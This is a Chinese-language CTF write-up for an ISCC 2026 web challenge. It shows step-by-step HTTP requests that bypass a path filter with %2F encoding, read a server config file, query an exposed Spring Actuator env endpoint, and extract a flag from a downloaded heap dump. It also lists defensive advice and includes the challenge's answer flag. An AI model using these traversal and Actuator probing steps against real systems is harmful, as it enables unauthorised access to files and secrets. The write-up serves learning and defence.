# ISCC 2026 - 逆向穿越 (Web)

**题目分类**: Web  
**难度**: 中等  
**最终 Flag**: `ISCC{Double_Decode_Spring_Bingo_2026}`

---

## 题目描述

> 这是一个被重重防护包裹的配置节点。这里的防火墙非常敏感，任何试图跨越边界的行为都会被瞬间捕获。除非……你学会了如何倒着走路。

Spring Boot 风格配置中心，需要利用路径穿越 + Actuator 信息泄露获取 flag。

---

## 解题步骤

### Step 1: 信息收集

访问首页，发现配置中心核心接口：

```
GET /config/{app}/{profile}/{filename}
```

页面示例中包含两个请求：
- `/config/infra/default/setup.yml`
- `/config/app/dev/application.yml`

### Step 2: 获取应用配置（发现提示）

访问 `/config/app/dev/application.yml`，得到 hint：

```yaml
hint: 'This is just a mock repository config. The real secrets are in the main application.yml at the system root (/app/application.yml).'
```

说明 `filename` 参数存在文件读取能力，目标文件在 `/app/application.yml`。

### Step 3: 路径穿越读取系统配置

直接传绝对路径会被拦截，但将 `/` 进行 URL 编码为 `%2F` 即可绕过：

```
GET /config/app/dev/%2Fapp%2Fapplication.yml
```

返回内网配置，发现两个关键信息：

```yaml
management:
  endpoints:
    web:
      base-path: "/internal-monitor-xyz123"    # Spring Actuator 端点
      exposure:
        include: "env"

system:
  diagnostic:
    backup-download-path: ${SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH}
```

另外注意到 `FLAG` 被加入了 `keys-to-sanitize`，所以直接通过 Actuator env 端点看不到 flag 明文。

### Step 4: 获取诊断快照路径

访问 Spring Actuator 的环境变量端点：

```
GET /internal-monitor-xyz123/env/SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH
```

返回：

```json
{
  "property": {
    "value": "/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat"
  }
}
```

拿到了诊断转储文件的下载地址。

### Step 5: 下载诊断转储文件提取 Flag

诊断转储文件（Java heap dump / thread dump）是一个较大的二进制文件。虽然 Actuator 的 env 端点对 `FLAG` 做了脱敏，但**转储文件是内存快照，在生成时尚未被 sanitize**，flag 的明文仍然存在于文件中。

```
GET /api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat
```

下载后用 `strings` + `grep` 提取：

```bash
strings dump.dat | grep ISCC
```

成功提取 flag：

```
ISCC{Double_Decode_Spring_Bingo_2026}
```

---

## 关键知识点

| 技术点 | 说明 |
|--------|------|
| **URL 双重编码 / 路径穿越** | 使用 `%2F` 编码斜杠绕过路径检查，实现任意文件读取 |
| **Spring Actuator 信息泄露** | 未认证的 Actuator env 端点暴露环境变量和配置信息 |
| **诊断转储文件泄露** | 系统诊断转储（heap dump / thread dump）保留的运行时内存数据未被 sanitize，可提取敏感信息 |
| **keys-to-sanitize 局限性** | Spring Actuator 的 `keys-to-sanitize` 只对 env 端点 API 返回做脱敏，不影响已生成的内存转储文件 |

---

## 防御建议

1. Actuator 端点应配置认证授权，不应暴露在公网
2. `keys-to-sanitize` 仅对 API 返回脱敏，诊断转储应加密存储或自动清理
3. 文件读取接口应对路径做严格的合法性校验，防止 `../` 或 `%2F` 绕过
4. 环境变量中的敏感信息（如 flag）应使用专门的密钥管理服务，而非直接放在 env 中
